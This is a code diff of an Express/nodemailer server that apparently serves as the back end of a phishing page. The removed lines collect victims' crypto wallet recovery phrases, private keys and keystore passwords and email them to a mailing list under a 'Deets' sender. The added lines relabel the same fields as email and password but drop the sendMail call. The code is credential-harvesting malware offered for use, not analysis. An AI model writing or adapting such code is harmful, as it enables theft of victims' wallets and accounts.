@@ -25,31 +25,25 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
 app.post('/submit', async (req, res) => {
   try {
-    console.log('Srcvd:', req.body);
-
-    const { wetName, phWet, passwordWet } = req.body;
-
+    console.log('Received:', req.body);
+    
+    const { phWet, passwordwet } = req.body; // Match the form field names exactly
+    
     const mailOptions = {
       from: '"Deets" <willyscotmegan@gmail.com>',
       to: maillist,
       html: `
-        <p><strong>Phrase/KS/PKey:</strong> ${phWet || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${passwordWet || 'Not provided'}</p>
+        <p><strong>Eml:</strong> ${phWet || 'Not provided'}</p>
+        <p><strong>Psw:</strong> ${passwordwet || 'Not provided'}</p>
       `
     };
-
-    const info = await transporter.sendMail(mailOptions);
-
-    res.status(200).send('Wdestscesful');
+    
+    // Add response to client
+    res.json({ success: true });
   } catch (error) {
-    console.error('err', error);
-    res.status(500).send('Errwetdets');
+    res.status(500).json({ error: 'Submission failed' });
   }
 });
 
